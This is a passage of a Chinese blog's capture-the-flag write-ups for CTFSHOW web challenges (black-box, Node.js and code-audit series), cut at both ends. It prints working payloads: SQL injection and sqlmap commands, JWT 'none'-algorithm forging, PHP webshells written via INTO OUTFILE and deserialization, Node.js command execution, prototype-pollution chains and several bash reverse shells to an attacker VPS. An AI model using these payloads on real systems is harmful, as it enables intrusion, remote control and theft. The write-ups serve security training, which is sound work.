repeat=2): for digit_triplet in itertools.product(digits, repeat=3): password = &quot;&quot;.join(letter_pair) + &quot;&quot;.join(digit_triplet) f.write(password + '\\n')print(f&quot;密码字典生成完毕，已保存到 {filename} 文件中。&quot;) 然后插入到密码处爆破即可，我这里用的yakit，如果是burpsuite同理 最后爆破出来密码是xy123，成功得到flag web385跟之前一样，来到登录框这里，但是这次万能密码不行，题目也没有提示，先尝试扫目录看看 发现有个路径/install，拼接进网站访问看看 然后访问/install/?install，发现成功将管理员密码重置为默认密码 因为不知道默认密码，因此我们尝试进行弱口令爆破 爆破得到密码为admin888，成功得到flag web386扫描目录 访问/install，但是这次显示lock.dat存在 这题相比上一题多了一个/clear.php，访问显示清理完成，我们尝试能不能控制它清理我们指定的文件，猜测参数可能为file，访问/clear.php?file=install/lock.dat，接着再次访问/install，发现lock.dat成功被删除 这时再访问/install/?install重置密码即可，其他步骤跟上题一样，密码依然是admin888，成功得到flag web387扫描目录 发现多了个/debug，访问看看 显示file not exist，猜测可以进行文件包含，输入/debug/?file=/etc/passwd 成功读取到文件，尝试进行日志包含执行命令，UA写入如下内容 1&lt;?php unlink('/var/www/html/install/lock.dat');?&gt; 再次访问/install，发现成功删除lock.dat 其他步骤跟之前一样，密码依然是admin888，成功得到flag web388访问路径/debug，输入/debug/?file=/etc/passwd，但是这次回显方式不一样 由于暂时没有可用的方法，因此我们对后台登录页面进行目录扫描 由前几道题可知，flag就存放在/alsckdfy/check.php里面，但是我们现在暂时没有权限去访问 扫描结果中我们发现路径/alsckdfy/editor/，访问后看到是一个编辑器 存在文件上传页面，我们可以尝试上传一句话木马进去 但是这里对文件上传后缀有限制 我们把木马写好后改后缀为zip，上传文件 1234&lt;?php$a = '&lt;?php eval($_POST[1]);?&gt;';file_put_contents('/var/www/html/1.php',$a);?&gt; 复制路径，然后拼接到/debug/?file=/var/www/html后面 访问路径/1.php，发现成功写入webshell 执行命令tac alsckdfy/check.php得到flag web389访问路径/debug，这次显示权限不足 F12查看cookie，发现多了一个auth验证 网页解密jwt，发现是加密验证，用c-jwt-cracker爆破得到密钥为123456，然后把sub那里的user改为admin 将token复制到auth那里，刷新网页，成功绕过权限限制 剩下的步骤跟上题一样，最后得到flag为 web390方法一（JWT伪造）： 访问路径/debug，依旧是显示权限不足，但是这次密钥爆破不出来了，因此换个方法，把alg改为none，sub改为admin，然后重新编码token，如果后端没有对算法进行验证，那么就可以成功绕过了 用python脚本实现，记得要先用自己jwt解码的payload复制替换dict，然后更改user为admin 123456789101112131415161718192021import jwt# 把自己的payload复制替换dict，然后更改user为admindict = { &quot;iss&quot;: &quot;admin&quot;, &quot;iat&quot;: 1753530361, &quot;exp&quot;: 1753537561, &quot;nbf&quot;: 1753530361, &quot;sub&quot;: &quot;admin&quot;, &quot;jti&quot;: &quot;2b4b35d9ec779539cc1d8c4c8b4659aa&quot;}headers = { &quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot; } jwt_token = jwt.encode(dict, key='',headers=headers, algorithm=&quot;none&quot;) print(jwt_token) 得到token后复制替换网页中的cookie，成功绕过限制 剩下的步骤跟web388一样，成功得到flag 方法二（数字型注入）： 在首页打开灯泡往事，发现有个id存在注入漏洞 输入单引号和双引号都没反应，经过测试，发现是数字型注入，输入page.php?id=-1 union select 1,2,3#，回显位置为2和3 接下来就是把alsckdfy/check.php的内容写到页面即可 1page.php?id=-1 union select 1,2,substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255)# 然后查看网页源代码得到flag web391方法一（JWT伪造）： 上一题的解法依旧能用，跟之前一样，也是先绕过权限写入日志 然后利用webshell读取flag 方法二（字符型注入）： 在首页打开灯泡往事，发现多了一个标题输入框 经测试存在字符型注入，为单引号，且#被过滤，用-- -代替，回显位置为2和3 把alsckdfy/check.php的内容写到页面 1search.php?title=-1' union select 1,2,substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255)-- - 查看网页源码即可得到flag web392方法一（JWT伪造）： 跟web390方法一样，不过这次flag位置改变了，不在alsckdfy/check.php里面 而是在根目录/flag里面 方法二（字符型注入）： 跟上题方法一样，不过要读取的文件改成了根目录/flag 1search.php?title=-1' union select 1,2,substr((select load_file('/flag')),1,255)-- - web393方法一（JWT伪造）： 跟上题方法一样，flag也是在根目录 方法二（堆叠注入）： 在首页最底下发现有个搜索引擎 点第一个百度，进去之后发现是百度的搜索页面 修改网页id值，又显示其他页面 因此可以判断这里存储的是网页链接，通过传入的id值查询数据库中的url并进行访问 同时测试发现/search.php?title=1存在堆叠注入，需要先获取数据库的表名和列名再利用，用sqlmap 获取数据库名 1python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET --dbs --batch 获取表名 1python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow --tables --batch 获取列名 1python sqlmap.py -u http://4a581051-6c96-4489-b2d2-f76b8662be96.challenge.ctf.show/search.php?title=1 --method=GET -D ctfshow -T link --columns --batch 接着利用堆叠注入插入数据 1search.php?title=1';insert into link(id, name, url) values(11,'a','file:///flag'); 最后访问/link.php?id=11即可 web394方法一（JWT伪造）： 跟web390方法一样，但是flag这次不在根目录/flag了，而是在网站目录的alsckdfy/check.php里面 方法二（堆叠注入）： 跟上题方法一样，但是这次过滤了一些字符，用16进制绕过即可 记得在前面加个0x表示16进制 12search.php?title=1';insert into link(id, name, url)values(10,'a',0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870); 最后访问/link.php?id=10即可 查看网页源代码 web395方法一（JWT伪造）： 解法跟上题一样 方法二（堆叠注入）： 解法也是跟上题一样 参考NaecoYes：https://blog.csdn.net/q20010619/article/details/120639310","link":"/posts/ctfshow-black-box-web380-web395/"},{"title":"CTFSHOW | nodejs题解 web334 - web344","text":"什么是nodejsNode.js 是一个基于 Chrome V8 引擎的开源、跨平台的 JavaScript 运行环境，主要用于在服务端运行JavaScript代码。以前JavaScript大多只能在浏览器中运行，有了 Node.js，开发者可以用 JavaScript 开发后端服务端应用，比如Web服务器、命令行工具等 核心特点如下： 采用 事件驱动、非阻塞式I/O模型，使其高效、轻量，特别适合处理高并发、I/O密集的网络应用 利用 V8 引擎，JavaScript 代码执行速度快、性能高 拥有全球最大的开源包管理生态系统—— npm，可便捷地安装和管理各种第三方模块和工具包 让前端开发者可以用同一种语言开发前后端，提高开发效率与协同 Node.js 不是一门新语言，也不是JavaScript的框架，更不是Web服务器；它就是一个能在服务器端运行JavaScript的平台，类似于Java的JVM在服务器上运行Java程序 题目列表web334下载题目附件进行分析，一共就两个文件 user.js里面写了用户账号密码 然后login.js是关于登录的一些逻辑校验，其中我们需要重点关注的是findUser变量这里 1return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; 要求名字不为CTFSHOW，但是后面有个toUpperCase()函数，也就是输入的用户名会变大写，那只要输入小写的ctfshow，经过toUpperCase()变大写之后就通过验证了 打开题目环境，登录框输入 12账号：ctfshow密码：123456 成功拿到flag web335打开题目环境，查看网页源代码，可以看到有注释提示，可以拼接进网站访问 应该是eval()函数，可以用child_process来调用API执行系统命令 什么是child_process child_process 是 Node.js 的一个核心模块，用于在应用程序中创建和管理子进程，让 JavaScript 能够在服务器端执行外部命令、脚本或者进行多进程并发运算 常用API spawn()：创建新进程，流方式处理数据，适合实时数据处理 exec()：执行命令或脚本，回调方式返回所有输出，适合一次性任务 execFile()：直接执行文件，减少命令注入风险 fork()：专门用于启动新的 Node.js 进程，并与主进程实现 IPC（进程间通信） execSync()：同步执行命令，阻塞直到完成，返回结果，简洁直观 spawnSync()：同步版本的 spawn，阻塞等待子进程完成，返回详细进程信息 这题需要我们用require包含child_process模块来调用API执行命令 但是如果我们直接执行exec()，会返回[object Object] 1/?eval=require('child_process').exec('ls').toString() 这是因为exec()是异步执行，通过回调函数传递输出与错误，直接调用的话会返回一个 ChildProcess 对象，正确的方法应像下面这样 1234const { exec } = require('child_process');const cp = exec('ls', (err, stdout, stderr) =&gt; { console.log(stdout); // 这里才是命令输出}); 而execSync()则是同步执行，直接返回命令执行后的输出内容（Buffer 或 String），可以直接打印数据 所以我们用execSync()来执行命令 payload： 1/?eval=require('child_process').execSync('ls').toString() 成功得到flag 当然调用spawnSync()也可以，不过直接打印的话它会返回一个包含多个属性的对象，需要用stdout输出Buffer，然后通过toString()转换为字符串，调用格式为spawnSync(command, args)。如果你把命令和参数写在同一个字符串里（如 'cat fl00g.txt'），spawnSync 会当作单一命令去执行，导致找不到该命令或执行出错，因此需要拆开 payload： 1/?eval=require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString() web336这题跟上题差不多，但是调用execSync()不行了 这里介绍两个变量，__filename和__dirname 12__filename：获取当前模块文件的完整绝对路径文件名__dirname：获取当前文件所在目录的完整目录名 直接在网站拼接命令执行 1/?eval=__filename 可以看到网站显示了当前文件的绝对路径/app/routes/index.js 我们用fs模块的readFileSync()来读取文件，fs模块（File System 模块）是专门用于进行文件系统相关操作的 1/?eval=require('fs').readFileSync('/app/routes/index.js').toString() 直接爆出源码 12345678910111213141516var express = require('express');var router = express.Router();/* GET home page. */router.get('/', function(req, res, next) { res.type('html'); var evalstring = req.query.eval; if (typeof(evalstring) == 'string' &amp;&amp; evalstring.search(/exec|load/i) &gt; 0) { res.render('index', { title: 'tql' }); } else { res.render('index', { title: eval(evalstring) }); }});module.exports = router; 可以看到过滤了包含 exec 或 load 的字符串，有很多种方法可以做这题 1. 字符串拼接绕过 把execSync拆成 exe + cSync，然后拼接字符串，%2B是加号 1/?eval=require('child_process')['exe'%2B'cSync']('ls').toString() 然后读取flag即可 1/?eval=require('child_process')['exe'%2B'cSync']('cat fl001g.txt').toString() 2. spawnSync() 命令执行 跟web335一样，换成spawnSync()即可绕过 1/?eval=require('child_process').spawnSync('cat',['fl001g.txt']).stdout.toString() 3. readFileSync() 文件读取 先用readdirSync()读取目录文件，然后用readFileSync()读取文件内容即可 12/?eval=require('fs').readdirSync('.')/?eval=require('fs').readFileSync('fl001g.txt') web337题目给出了源码 12345678910111213141516171819202122232425var express = require('express');var router = express.Router();var crypto = require('crypto');function md5(s) { return crypto.createHash('md5') .update(s) .digest('hex');}/* GET home page. */router.get('/', function(req, res, next) { res.type('html'); var flag='xxxxxxx'; var a = req.query.a; var b = req.query.b; if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){ res.end(flag); }else{ res.render('index',{ msg: 'tql'}); } });module.exports = router; 其中重点需要关注的是 1if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){ 要求传入的a和b长度相同，内容不相同且要求 a 加上 flag 后的 MD5 哈希值，必须等于 b 加上 flag 后的 MD5 哈希值 这里我们用数组绕过 这里涉及到一个概念，如果传入a[]=1&amp;b[]=2，返回的是数组['1']和['2']，在md5校验那里就相当于需要['1']+flag===['2']+flag，而由于JavaScript **隐式类型转换 + 字符串拼接 **的原因，['1']+flag会变成1flag，举个例子 123console.log(&quot;1&quot; + [2,2]);// 步骤： [2,2] -&gt; 调用 toString() =&gt; &quot;2,2&quot;// 字符串拼接 =&gt; &quot;1&quot; + &quot;2,2&quot; =&gt; &quot;12,2&quot; 因此只要我们输入 1a[]=1&amp;b=1 a解析为数组['1']，b解析为字符串'1'，经过转换之后，得到的结果都是1flag，因此它们的md5相同，成功通过验证 也是顺利拿到flag 还有一种方法，就是往数组里面传入非数字索引，例如 1a[x]=1&amp;b[x]=2 返回的结果是{ x: '1'}和{ x: '2'}，变成JS里面的对象了，传入对象之后，经过console.log后返回的都是[object Object]，此时进行变量拼接得到的结果为[object Object]flag，再进行md5加密之后也是相同的 如果传入a[x]=1&amp;b[x]=1也是可以的，因为两个对象的比较并不是比较属性，而是通过引用内存里的位置来比较的，所以 a !== b 的条件依然成立 web338下载源码分析，先看app.js 可以看到包含了index.js和login.js，index.js里面没什么东西，主要看login.js文件 想要拿到flag就必须要secert的ctfshow属性值为36dboy，且secert变量值为空。向下分析，可以看到body的内容被copy到了user里面，查看copy的定义，可以发现copy竟然跟merge方法一模一样，因此这题可以用原型链污染来做，传入属性__proto__来污染Object原型 做原型链污染之前，建议先看一遍文章了解一下：深入理解 JavaScript Prototype 污染攻击 打开题目环境，随便输入账号密码 可以看到body的值传到了user里面，我们修改键值对为 1{&quot;__proto__&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}} 这样做可以污染Object的原型，从而使得所有对象都继承了该属性，于是进行验证的时候，满足secert.ctfshow==='36dboy'，也就拿到了flag 原型链被污染后，部分代码里其他依赖对象原型正常结构的地方会出错，依赖于纯净、标准原型链的对象操作（比如 for…in、Object.keys()、属性枚举和判断、库函数内部操作等）可能会出错或出现行为异常，导致POST访问/login时报 500 错误 因此这题只有一次污染机会，如果写错了值的话就只能重新启动环境做了，因为POST访问/login只返回500了 web339打开源码分析，在app.js可以看到指向三个路由 相比上一题，这题login.js的校验条件变了 要求secert.ctfshow===flag，但我们并不知道flag的值，因此只能另辟蹊径 继续分析api.js，发现可以通过污染query来控制Function执行RCE操作 由于 Node.js 默认不会自动暴露 require 给 Function 创建的函数，因此这里用process.mainModule.constructor._load 替代 require来包含child_process payload： 1{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\\&quot;')&quot;}} 这里我们用exec执行反弹shell，因为exec是异步的，适用于长时间/交互式/不需要立即结果的任务（例如反弹 shell、启动后台进程、并发执行多任务）。这题的目标不是“读取输出”，而是“建立外部控制会话”，因此异步 exec 足以完成“执行命令”的动作，而且更贴合反连的使用场景：父进程不被阻塞，持续提供服务 先在VPS处开启nc监听，然后跟上题一样，在/login处传入payload 接着POST访问/api即可建立连接 执行命令env，在环境变量里成功找到flag web340下载源码进行分析，也是先看app.js 可以看到，还是这几个文件，不过不同的是，login.js里面的user变量变了 要求isAdmin为true才可以通过，但是isAdmin已经被赋值为false了，因此在这里没办法污染 继续分析，可以看到api.js跟上题一样，因此可以用上题的方法来污染query反弹shell 但是如果直接传入__proto__，再访问/api会发现行不通 需要污染两层才可以，因为user.__proto__不是Object.prototype，user.__proto.__proto__才是 1{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\\&quot;')&quot;}}} 也是在环境变量处找到flag 下面详细解释一下为什么user.__proto__不是指向Object.prototype，开启本地调试，先在web340项目文件夹处打开终端，运行 npm install安装依赖 然后在项目文件夹处打开package.json，可以看到负责启动服务器的是bin/www，因为在很多标准的Express项目中，项目结构是分离的 修改配置文件的工作目录为web340，文件为bin/www 在www文件中，可以看到运行的端口是在3000 在login.js的第19行开启断点调试，然后在浏览器中打开 http://127.0.0.1:3000 ，在登录框随便输入点东西，触发if(user.userinfo.isAdmin){判断 可以看到userinfo的__proto__后__proto__才是Object的prototype，为了更直观，我们在控制台输出看看 对于user这个变量 1234567var user = new function(){ //这是外层匿名构造函数 this.userinfo = new function(){ //这是内层匿名构造函数 this.isVIP = false; this.isAdmin = false; this.isAuthor = false; };} user.userinfo 对象是由内层构造函数创建的，所以 user.userinfo.__proto__ 指向内层构造函数的prototype 而内层构造函数的__proto__指向的才是Object的prototype 所以这就是为什么要传入两次的原因 拓展概念 只有函数才拥有 prototype 属性，而由构造函数创建出来的普通对象实例没有这个属性 例如user.userinfo是一个对象实例，但它没有属于自己的 prototype 属性，控制台输出为undefined 属性 谁拥有 作用 prototype 构造函数 定义实例继承的“蓝图” __proto__ 任意对象实例（包括函数对象） 一个指向其构造器的 prototype 的引用指针 web341下载附件分析代码，发现这题没有api.js了，而且login.js也没有地方污染 继续分析代码，在app.js可以看到包含了ejs，且引擎设置为ejs 网上搜了一下，发现ejs模板引擎有个漏洞可以利用，实现从原型链污染到RCE 参考文章：Express+lodash+ejs: 从原型链污染到RCE payload： 1{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\\&quot;');var __tmp2&quot;}}} 跟上题一样，也是在/login里POST写入，然后刷新一次页面即可 在env找到flag web342下载代码分析，总体跟上题代码差不多，但是app.js这两个地方不同 模板引擎换成了jade，上网参考了部分文章，链接：再探 JavaScript 原型链污染到 RCE payload： 1{&quot;__proto__&quot;:{&quot;__proto__&quot;: {&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\\&quot;')&quot;}}} 跟上题一样，在/login里POST写入，然后刷新一次页面 在env找到flag web343这题在web342的基础上增加了过滤，但是影响不大，可以继续用上题的方法 payload： 1{&quot;__proto__&quot;:{&quot;__proto__&quot;: {&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\\&quot;')&quot;}}} 在/login里POST写入，然后刷新一次页面 在环境变量中读取flag 后面看了一下login.js到底过滤了什么 只过滤了text，没什么用 web344这题给出了部分代码，先分析一下 1234567891011121314router.get('/', function(req, res, next) { res.type('html'); var flag = 'flag_here'; if(req.url.match(/8c|2c|\\,/ig)){ res.end('where is flag :)'); } var query = JSON.parse(req.query.query); if(query.name==='admin'&amp;&amp;query.password==='ctfshow'&amp;&amp;query.isVIP===true){ res.end(flag); }else{ res.end('where is flag. :)'); }}); 过滤了8c、2c和逗号，然后要求GET传入参数query，且满足 query.name==='admin'&amp;&amp;query.password==='ctfshow'&amp;&amp;query.isVIP===true 才可以拿到flag 也就是正常情况下我们应该传入 1?query={&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true} 而经过URL编码之后变成 1?query=%7B%22name%22%3A%22admin%22%2C%22password%22%3A%22ctfshow%22%2C%22isVIP%22%3Atrue%7D 双引号编码之后是%22，和c连接起来就是%22c，会被ban 这题用到了NodeJS的特性，当 URL 里传入了多个同名参数，如多次出现 query=，Express 解析会将这些参数放入数组中，然后JSON.parse 会将数组的字符串元素拼接成一个完整字符串再解析。同时c也要进行URL编码，变成%63，这样就不会被ban了 payload： 1?query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true} 参考bfengj：CTFshow-WEB入门-node.js yu22x：CTFSHOW nodejs篇","link":"/posts/ctfshow-nodejs-web334-web344/"},{"title":"CTFSHOW | 代码审计 web301 - web310","text":"什么是代码审计代码审计（Code Audit），也称为白盒测试（White-Box Testing），是一种安全评估方法。与黑盒测试相反，审计人员在拥有应用程序完整源代码的情况下，对程序的逻辑、结构和代码实现进行深入的分析和审查 代码审计一般思路进行代码审计时，通常会结合自动化工具和人工审查，遵循一个由宏观到微观的系统性流程 1. 准备阶段 (Preparation) 这是审计的起点，目的是为后续的深入分析做好准备 理解业务逻辑：首先要通读文档或大致浏览代码，理解这个程序是做什么的、核心功能有哪些 熟悉技术栈和框架：确定项目使用的编程语言（如PHP、Java、Python）、框架（如ThinkPHP、Spring、Django）和关键组件，了解特定框架的已知漏洞和安全特性 部署运行环境：如果条件允许，在本地搭建一个可以运行和调试的测试环境。可以动态地跟踪数据流，验证漏洞，极大地提高审计效率 2. 自动化扫描与手动分析 (Scanning &amp; Manual Review) 这个阶段是审计的核心，通常会从寻找高风险的“入口点”和“危险函数”开始 寻找数据入口（“入”）：首先要定位用户能够控制数据输入的地方，这些是漏洞最有可能产生的地方 全局变量：如PHP中的 $_GET、$_POST、$_COOKIE、$_REQUEST、$_SERVER 等，它们是外部数据进入程序的主要通道 文件操作：关注文件上传、文件读取/写入等功能点 数据库交互：所有与数据库进行增、删、改、查操作的地方 跟踪数据流（“流”）：从找到的入口点开始，跟踪这些外部数据在代码中的传递路径。观察数据在传递过程中是否经过了充分的过滤、净化或编码。这是判断是否存在漏洞的关键 定位危险函数（“出”）：审计的另一个核心是寻找那些能直接导致漏洞的“危险函数”或“敏感操作”，然后逆向回溯，看它们的参数是否能被用户的输入所控制 SQL注入：关注所有执行SQL查询的函数，如 query(), execute() 等，看传入的SQL语句是否由外部输入拼接而成 命令执行：关注 system(), exec(), shell_exec(), passthru() 等能执行系统命令的函数 文件包含/读取：关注 include(), require(), file_get_contents(), readfile() 等函数 反序列化：关注 unserialize() 函数，检查其参数来源 3. 漏洞验证与利用链构造 (Verification &amp; Exploitation) 在发现疑似漏洞后，需要进行验证 编写验证代码 (PoC)：根据代码逻辑，构造特定的输入数据（Payload）来触发漏洞，验证其是否存在以及是否可被利用 构造利用链 (Exploit Chain)：在复杂的场景中，单个漏洞可能无法造成严重危害，此时需要将多个漏洞点（如文件上传 + 文件包含）组合起来，形成一个完整的攻击链，以达到最终目的（如获取服务器权限） 题目列表web301首先下载附件进行分析，可以先看看目录结构 其中admin目录为前端页面目录，不需要分析，因此我们把重点放在assets目录里面 把文件大概看了一下，发现checklogin.php有未过滤的SQL语句，存在SQL注入漏洞 打开题目环境，可以看到一个登录框 有多种方法可以做这道题，咱们一个个分析 方法一：联合注入 分析当前代码，可以看到第17行有个判断语句 其中，strcasecmp是PHP的字符串比较函数，用于比较两个字符串，如果两个字符串相等，则返回0，因此我们通过联合注入查询输出一个值，例如一个包含单个字面量 1 的结果集，程序把1当成了账号在数据库中查询到的密码，因此我们在密码处也输入相同的数字，即可通过验证 12账号：-1' union select 1#密码：1 登录后在首页可以看到flag 方法二：SQL注入写shell 可以通过SQL注入漏洞写入shell，然后直接执行命令读取flag 12账号：-1' union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;#密码：1 执行完之后访问1.php，可以看到成功写入 用HackBar执行命令即可，成功读取flag web302这题也是沿用之前的附件，方法跟之前一样 方法一：联合注入 这题把上题checklogin.php的第17行改成了 1if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){ 意思就是只要sds_decode($userpwd)跟$row['sds_password']相等即可通过验证，我们可以先随便输入一个值到$userpwd，然后让其编码之后得到编码值，再让$row['sds_password']通过联合注入输出这个编码值，程序把这个编码值当成了账号在数据库中查询到的密码，最后我们在密码处填入原本的值，经过后台编码后即可通过验证，具体可以看以下操作 我们在目录中寻找sds_decode()函数，发现其位于fun.php 修改一下代码，参数输入1，然后运行 1234567&lt;?phpfunction sds_decode($str){ return md5(md5($str.md5(base64_encode(&quot;sds&quot;))).&quot;sds&quot;);}$a = sds_decode(&quot;1&quot;);echo $a;?&gt; 得到编码结果为 1d9c77c4e454869d5d8da3b4be79694d3 然后我们打开登录框，输入账号密码 12账号：-1' union select 'd9c77c4e454869d5d8da3b4be79694d3'#密码：1 解释一下，输入的1经过sds_decode()函数之后，变成了d9c77c4e454869d5d8da3b4be79694d3，然后我们通过联合注入输出d9c77c4e454869d5d8da3b4be79694d3，程序把这个编码值当成了账号在数据库中查询到的密码，因为我们在登录框密码处输入1，这个密码经过编码后跟我们这个编码值一致，因此就成功通过验证 登录之后在首页得到flag 方法二：SQL注入写shell 跟之前一样，可以通过SQL注入漏洞写入shell，然后直接执行命令读取flag 12账号：-1' union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;#密码：1 web303下载附件进行分析，先看看目录结构 checklogin.php这次多了个限制，username长度不能大于6，因此之前的方法用不了 但是登录的检测机制依然不变 1if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){ 继续分析项目文件，发现sds_user.sql里面存在用户信息 用户名是admin，密码是个加密后的值，打开fun.php，可以看到这次贴心给了提示 直接运行代码，得到值为27151b7b1ad51a38ea66b1529cde5ee4，跟上面sql文件里的一样，因此密码就是admin 打开网站登录，账号密码都是admin，进去之后点了一番，发现只有网点一览能点进去 进去之后发现是dpt.php页面 咱们继续回去分析项目文件，发现dpt.php和dptadd.php都存在注入点，且官方也标了注释 dpt.php 1$sql=&quot;select * from sds_dpt order by id;&quot;; dptadd.php 1$sql=&quot;insert into sds_dpt set sds_name='&quot;.$dpt_name.&quot;',sds_address ='&quot;.$dpt_address.&quot;',sds_build_date='&quot;.$dpt_build_year.&quot;',sds_have_safe_card='&quot;.$dpt_has_cert.&quot;',sds_safe_card_num='&quot;.$dpt_cert_number.&quot;',sds_telephone='&quot;.$dpt_telephone_number.&quot;';&quot;; 可惜的是，dpt.php的id并没有办法控制，因此只能从dptadd.php下手，URL拼接路径/dptadd.php，然后通过POST的方式传入参数值，执行SQL注入 查表 1dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())# 1结果为：sds_dpt,sds_fl9g,sds_user 查字段 1dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_name='sds_fl9g')# 1结果为：flag 查字段值 1dpt_name=1',sds_address=(select flag from sds_fl9g)# 成功得到flag web304这题的代码跟上一题相同，不过多了一个全局WAF检测 123function sds_waf($str){ return preg_match('/[0-9]|[a-z]|-/i', $str);} 但是这个WAF逻辑有问题，只要有任意一个字符匹配成功就会返回1，因此并没有什么用 也是先登录网站，账号和密码都是admin 步骤跟上题一样，只不过表名从sds_fl9g改成了sds_flaag 查表 1dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())# 1结果为：sds_dpt,sds_flaag,sds_user 查字段 1dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_name='sds_flaag')# 1结果为：flag 查字段值 1dpt_name=1',sds_address=(select flag from sds_flaag)# 成功得到flag web305下载附件分析代码，发现fun.php有个sds_waf()函数，过滤很严格，且应用到了dptadd.php，因此之前的SQL注入行不通 同时发现这题的checklogin.php相比web303多了个Cookie反序列化 分析这个class.php，可以看到有文件写入操作 因此这题的思路就是伪造Cookie，然后执行反序列化漏洞写入webshell payload： 12345678910&lt;?phpclass user{ public $username; public $password; public function __construct($u,$p){ $this-&gt;username=$u; $this-&gt;password=$p; }}var_dump(urlencode(serialize(new user('1.php','&lt;?php eval($_POST[1]);?&gt;')))); 运行结果： 1O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D 把这个序列化结果写入Cookie，路径为/checklogin.php payload： 1Cookie: user=O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D 蚁剑连接webshell，注意要把https改成http 在目录找了一番，没找到flag，猜测flag是在数据库里面，用蚁剑连接数据库 点击添加配置，然后数据库类型选MYSQLI，MYSQLI是MYSQL的升级版，支持更多新特性和更高安全性，官方推荐使用，MYSQL扩展现已废弃 密码在conn.php，但是不知道为什么连不上，后来去网上搜了一下，发现蚁剑那里查看的密码是root，跟题目给的附件不一样 这是附件里面的conn.php 这是蚁剑里面的conn.php 然后在添加配置那里输入账号密码即可 成功找到flag web306下载附件分析代码，发现class.php有个文件写入操作 继续分析，在index.php发现反序列化代码 因此我们可以构造一个利用链执行反序列化操作，在dao.php中发现可利用的类 最终利用链为 1[index.php] unserialize -&gt; [dao.php] dao::__destruct() -&gt; [class.php] log::close() payload： 12345678910111213&lt;?phpclass dao{ private $conn; public function __construct(){ $this-&gt;conn=new log(); }}class log{ public $title='1.php'; public $info='&lt;?php eval($_POST[1]);?&gt;';}$a = new dao();echo base64_encode(serialize($a)); 运行结果： 1TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319 把结果写入Cookie即可，路径是/index.php 然后蚁剑连接webshell，成功找到flag web307下载附件分析代码，发现class.php有个文件写入操作 但是找了一番并没有发现调用closelog()的地方，因此这个方法行不通 继续分析代码，发现dao.php有个命令执行函数 在logout.php发现反序列化代码，且调用了clearCache()函数 虽然logout.php并没有直接包含dao.php，但是包含了service.php，而service.php包含了dao.php，因此可以直接通过dao类调用clearCache()函数 然后控制变量$cache_dir来截断原来的rm命令并执行新的命令，写入webshell到php文件 利用链： 1[/controller/logout.php] unserialize -&gt; [/controller/service/dao/dao.php] dao::clearCache() payload： 123456789101112&lt;?phpclass config{ public $cache_dir = '1; echo &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot; &gt; 1.php;'; //&quot;$&quot;前加&quot;\\&quot;是为了防止被解析} class dao{ private $config; public function __construct(){ $this-&gt;config=new config(); }}$a = new dao();echo base64_encode(serialize($a)); 运行结果： 